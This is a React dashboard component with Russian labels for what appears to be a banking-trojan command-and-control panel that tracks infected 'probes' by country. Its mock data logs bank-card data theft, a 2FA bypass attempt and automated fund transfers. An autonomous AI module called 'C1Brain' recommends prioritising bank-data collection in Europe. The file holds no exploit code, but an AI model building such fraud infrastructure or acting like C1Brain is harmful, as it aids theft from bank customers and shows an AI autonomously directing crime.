import { useEffect, useState } from 'react';
import {
  Box,
  SimpleGrid,
  Stat,
  StatLabel,
  StatNumber,
  StatHelpText,
  StatArrow,
  Flex,
  Text,
  Heading,
  Card,
  CardHeader,
  CardBody,
  Progress,
  Badge,
  useColorModeValue,
  Icon,
  Divider,
} from '@chakra-ui/react';
import { FiServer, FiActivity, FiAlertCircle, FiCheck, FiCpu } from 'react-icons/fi';
import { SystemInfo, ZondConnectionStatus } from '../types';

// Моковые данные для демонстрации
const mockSystemInfo: SystemInfo = {
  totalZonds: 24,
  activeZonds: 18,
  activeTasks: 37,
  completedTasks: 152,
  pendingTasks: 14,
  systemLoad: 42,
  uptime: 347520, // 4 дня в секундах
  version: '1.2.3',
  lastUpdate: '2023-05-10T14:32:45Z',
};

const mockRecentActivities = [
  { id: '1', type: 'task_complete', message: 'Задача "Сбор данных банковской карты" завершена', time: '15 мин назад', zondId: 'zond-12' },
  { id: '2', type: 'c1brain_decision', message: 'C1Brain принял решение обновить зонд-07', time: '32 мин назад', zondId: 'zond-07' },
  { id: '3', type: 'task_failed', message: 'Задача "Обход 2FA" не удалась', time: '1 час назад', zondId: 'zond-03' },
  { id: '4', type: 'new_zond', message: 'Новый зонд подключен из России', time: '3 часа назад', zondId: 'zond-24' },
  { id: '5', type: 'ats_operation', message: 'ATS выполнил перевод средств', time: '5 часов назад', zondId: 'zond-18' },
];

const mockZondsByStatus = {
  [ZondConnectionStatus.ONLINE]: 18,
  [ZondConnectionStatus.OFFLINE]: 3,
  [ZondConnectionStatus.CONNECTING]: 2,
  [ZondConnectionStatus.ERROR]: 1,
};

const mockTopZonds = [
  { id: 'zond-12', name: 'RU-Moscow-Desktop-01', tasks: 8, success: 92 },
  { id: 'zond-05', name: 'FR-Paris-Mobile-03', tasks: 6, success: 88 },
  { id: 'zond-18', name: 'UK-London-Server-01', tasks: 12, success: 85 },
];

const StatusCard = ({ title, count, icon, color }: { title: string; count: number; icon: any; color: string }) => {
  const cardBg = useColorModeValue('white', 'gray.700');
  const textColor = useColorModeValue('gray.600', 'gray.400');
  
  return (
    <Card bg={cardBg} boxShadow="sm" borderRadius="lg">
      <CardBody>
        <Flex justify="space-between" align="center">
          <Box>
            <Text color={textColor} fontSize="sm" fontWeight="medium">
              {title}
            </Text>
            <Text fontSize="2xl" fontWeight="bold">
              {count}
            </Text>
          </Box>
          <Flex
            w="12" h="12"
            bg={`${color}.100`}
            color={`${color}.500`}
            rounded="full"
            justify="center"
            align="center"
          >
            <Icon as={icon} boxSize="6" />
          </Flex>
        </Flex>
      </CardBody>
    </Card>
  );
};

const ActivityItem = ({ activity }: { activity: any }) => {
  let color = 'blue';
  let icon = FiActivity;
  
  if (activity.type === 'task_complete') {
    color = 'green';
    icon = FiCheck;
  } else if (activity.type === 'task_failed') {
    color = 'red';
    icon = FiAlertCircle;
  } else if (activity.type === 'c1brain_decision') {
    color = 'purple';
    icon = FiCpu;
  } else if (activity.type === 'new_zond' || activity.type === 'ats_operation') {
    color = 'blue';
    icon = FiServer;
  }
  
  return (
    <Box mb={3}>
      <Flex align="center">
        <Flex
          w="8" h="8"
          bg={`${color}.100`}
          color={`${color}.500`}
          rounded="full"
          justify="center"
          align="center"
          mr={3}
        >
          <Icon as={icon} />
        </Flex>
        <Box flex="1">
          <Text fontWeight="medium">{activity.message}</Text>
          <Flex justify="space-between" align="center">
            <Text fontSize="sm" color="gray.500">{activity.time}</Text>
            <Badge colorScheme="blue" variant="subtle" size="sm">{activity.zondId}</Badge>
          </Flex>
        </Box>
      </Flex>
      <Divider mt={3} />
    </Box>
  );
};

const ZondStatusBar = () => {
  const total = mockSystemInfo.totalZonds;
  
  return (
    <Box>
      <Text mb={2} fontWeight="medium">Статус зондов ({total})</Text>
      <Flex align="center" mb={2}>
        <Progress 
          value={100} 
          colorScheme="gray"
          size="sm"
          w="full"
          borderRadius="full"
          bg={useColorModeValue('gray.100', 'gray.700')}
        >
          <Progress 
            value={(mockZondsByStatus[ZondConnectionStatus.ONLINE] / total) * 100} 
            colorScheme="green" 
            size="sm"
            borderLeftRadius="full"
            min={0}
          />
        </Progress>
      </Flex>
      <Flex justify="space-between">
        <Badge colorScheme="green" variant="subtle">
          Онлайн: {mockZondsByStatus[ZondConnectionStatus.ONLINE]}
        </Badge>
        <Badge colorScheme="orange" variant="subtle">
          Подключение: {mockZondsByStatus[ZondConnectionStatus.CONNECTING]}
        </Badge>
        <Badge colorScheme="red" variant="subtle">
          Офлайн: {mockZondsByStatus[ZondConnectionStatus.OFFLINE]}
        </Badge>
        <Badge colorScheme="red" variant="subtle">
          Ошибка: {mockZondsByStatus[ZondConnectionStatus.ERROR]}
        </Badge>
      </Flex>
    </Box>
  );
};

const TopZonds = () => {
  return (
    <Box>
      <Text fontWeight="medium" mb={4}>Топ зондов</Text>
      {mockTopZonds.map(zond => (
        <Box key={zond.id} mb={3}>
          <Flex justify="space-between" align="center" mb={1}>
            <Text fontWeight="medium">{zond.name}</Text>
            <Badge colorScheme="green">{zond.success}%</Badge>
          </Flex>
          <Progress 
            value={zond.success} 
            colorScheme="green" 
            size="sm"
            borderRadius="full"
          />
          <Text fontSize="sm" color="gray.500" mt={1}>
            {zond.tasks} активных задач
          </Text>
          <Divider mt={3} />
        </Box>
      ))}
    </Box>
  );
};

const Dashboard = () => {
  const [systemInfo, setSystemInfo] = useState<SystemInfo>(mockSystemInfo);
  const [activities, setActivities] = useState(mockRecentActivities);
  
  // Имитация загрузки данных
  useEffect(() => {
    // В реальном приложении здесь был бы API запрос
    const timer = setTimeout(() => {
      setSystemInfo(mockSystemInfo);
      setActivities(mockRecentActivities);
    }, 1000);
    
    return () => clearTimeout(timer);
  }, []);
  
  // Форматирование времени
  const formatUptime = (seconds: number) => {
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    
    return `${days}d ${hours}h ${minutes}m`;
  };
  
  return (
    <Box p={5}>
      <Heading size="lg" mb={5}>Панель управления</Heading>
      
      <SimpleGrid columns={{ base: 1, md: 2, lg: 4 }} spacing={5} mb={8}>
        <StatusCard 
          title="Активные зонды" 
          count={systemInfo.activeZonds} 
          icon={FiServer} 
          color="blue"
        />
        <StatusCard 
          title="Активные задачи" 
          count={systemInfo.activeTasks} 
          icon={FiActivity} 
          color="purple"
        />
        <StatusCard 
          title="Завершенные задачи" 
          count={systemInfo.completedTasks} 
          icon={FiCheck} 
          color="green"
        />
        <StatusCard 
          title="Ожидающие задачи" 
          count={systemInfo.pendingTasks} 
          icon={FiAlertCircle} 
          color="orange"
        />
      </SimpleGrid>
      
      <SimpleGrid columns={{ base: 1, lg: 2 }} spacing={8}>
        <Card>
          <CardHeader>
            <Heading size="md">Системная информация</Heading>
          </CardHeader>
          <CardBody>
            <SimpleGrid columns={2} spacing={4}>
              <Stat>
                <StatLabel>Нагрузка системы</StatLabel>
                <StatNumber>{systemInfo.systemLoad}%</StatNumber>
                <StatHelpText>
                  <StatArrow type="increase" />
                  5% с прошлой недели
                </StatHelpText>
              </Stat>
              <Stat>
                <StatLabel>Аптайм</StatLabel>
                <StatNumber>{formatUptime(systemInfo.uptime)}</StatNumber>
                <StatHelpText>Без перезагрузок</StatHelpText>
              </Stat>
              <Stat>
                <StatLabel>Версия</StatLabel>
                <StatNumber>{systemInfo.version}</StatNumber>
                <StatHelpText>Обновлено 3 дня назад</StatHelpText>
              </Stat>
              <Stat>
                <StatLabel>Всего зондов</StatLabel>
                <StatNumber>{systemInfo.totalZonds}</StatNumber>
                <StatHelpText>
                  <StatArrow type="increase" />
                  2 новых за неделю
                </StatHelpText>
              </Stat>
            </SimpleGrid>
            
            <Box mt={6}>
              <ZondStatusBar />
            </Box>
          </CardBody>
        </Card>
        
        <Card>
          <CardHeader>
            <Heading size="md">Недавние активности</Heading>
          </CardHeader>
          <CardBody>
            {activities.map(activity => (
              <ActivityItem key={activity.id} activity={activity} />
            ))}
          </CardBody>
        </Card>
        
        <Card>
          <CardHeader>
            <Heading size="md">Эффективность зондов</Heading>
          </CardHeader>
          <CardBody>
            <TopZonds />
          </CardBody>
        </Card>
        
        <Card>
          <CardHeader>
            <Heading size="md">Активность C1Brain</Heading>
          </CardHeader>
          <CardBody>
            <Box mb={4}>
              <Text fontWeight="medium" mb={2}>Текущий режим: Автономный</Text>
              <Progress 
                value={75} 
                colorScheme="purple" 
                size="sm"
                borderRadius="full"
              />
              <Text fontSize="sm" color="gray.500" mt={1}>
                Уровень автономности: 75%
              </Text>
            </Box>
            
            <Box mb={4}>
              <Text fontWeight="medium" mb={2}>Последнее размышление</Text>
              <Text fontSize="sm" color="gray.700">
                "Анализ показал улучшение в работе зондов после последнего обновления. Рекомендую увеличить приоритет задач сбора банковских данных для зондов в Европе."
              </Text>
              <Text fontSize="xs" color="gray.500" mt={1}>
                10 минут назад
              </Text>
            </Box>
            
            <Divider my={3} />
            
            <Box>
              <Text fontWeight="medium" mb={2}>Очередь команд</Text>
              <Flex justify="space-between" align="center" mb={2}>
                <Text fontSize="sm">Обновить зонд-07</Text>
                <Badge colorScheme="purple">Высокий</Badge>
              </Flex>
              <Flex justify="space-between" align="center">
                <Text fontSize="sm">Сбор данных ATM</Text>
                <Badge colorScheme="blue">Средний</Badge>
              </Flex>
            </Box>
          </CardBody>
        </Card>
      </SimpleGrid>
    </Box>
  );
};

export default Dashboard;